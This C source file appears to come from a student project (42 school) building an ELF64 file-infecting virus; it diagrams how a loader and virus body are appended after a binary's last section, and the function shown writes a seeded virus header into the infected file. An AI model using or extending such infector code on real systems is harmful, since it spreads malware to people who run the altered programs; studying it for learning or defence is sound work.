/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   setup_virus_header.c                               :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: agrumbac <agrumbac@student.42.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2019/05/11 00:10:33 by agrumbac          #+#    #+#             */
/*   Updated: 2020/12/01 21:03:49 by ichkamo          ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "accessors.h"
#include "errors.h"
#include "loader.h"
#include "utils.h"
#include "virus.h"

/*
**  Elf64_packer memory overview
**  ============================
**
**                          .        .
**                          |  ...   |
**              p_offset -> |========| PT_LOAD
**                          |  ...   |
**                          |  ...   |
**             sh_offset -> |--------|
**                      |   |  ...   |
**                      V   |  ...   |
**    offset_in_section -   |>>>>>>>>| entry    - relative_entry_address
**                          |  ...   |          ^
**                          |--------|          |
**                          |  ...   |          |
**                          |  ...   |          |
**   end_of_last_section -> |--------| -  -  -  -- -  -  -  -  -  -
**         @loader_entry -> |@@@@@@@@| |                          |
**                          |@      @| |                          |
**                          |@      @| |                          |
**                          |@@@@@@@@| V                          |
**                @virus -> |~~~~~~~~| - relative_virus_addresss  |
**                          |########| |                          |
**                          |########| |                          |
**                          |########| |                          |
**  @virus_header_struct -> |UNICORNS| V                          V
** @_start (placeholder) -> |~~~~~~~~| - virus_size               - payload_size
**                          |  ...   |
**                          |  ...   |
**                          |========|
**                          |  ...   |
**                          .        .
**
** Note that relative_virus_addresss is in the opposite direction !
*/

bool		setup_virus_header(struct safe_ptr ref, size_t end_of_last_section, uint64_t seed)
{
	struct virus_header	constants;

	constants.seed = seed;

	const size_t	payload_off       = end_of_last_section;
	const size_t	dist_entry_header = (size_t)virus_header_struct - (size_t)loader_entry;
	const size_t	virus_header_off  = payload_off + dist_entry_header;

	void	*constants_location  = safe(ref, virus_header_off, sizeof(constants));

	if (!constants_location) return errors(ERR_VIRUS, _ERR_IMPOSSIBLE);

	memcpy(constants_location, &constants, sizeof(constants));

	return true;
}
